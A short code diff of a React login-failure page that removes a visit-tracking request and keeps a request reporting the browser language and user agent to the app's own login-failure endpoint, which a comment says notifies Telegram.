@@ -9,17 +9,9 @@ export default function LoginFailure() {
 
   useEffect(() => {
     document.title = t('login_failure_page_title');
-    
-    // Track visitor when page loads with language info
-    const language = navigator.language || 'Unknown';
-    apiRequest("POST", "/api/track-visit", { 
-      page: "Login Failure Page",
-      language 
-    }).catch(() => {
-      // Silent fail - tracking shouldn't break the app
-    });
 
     // Send login failure notification to Telegram
+    const language = navigator.language || 'Unknown';
     const userAgent = navigator.userAgent || 'Unknown';
     apiRequest("POST", "/api/login-failure", {
       language,
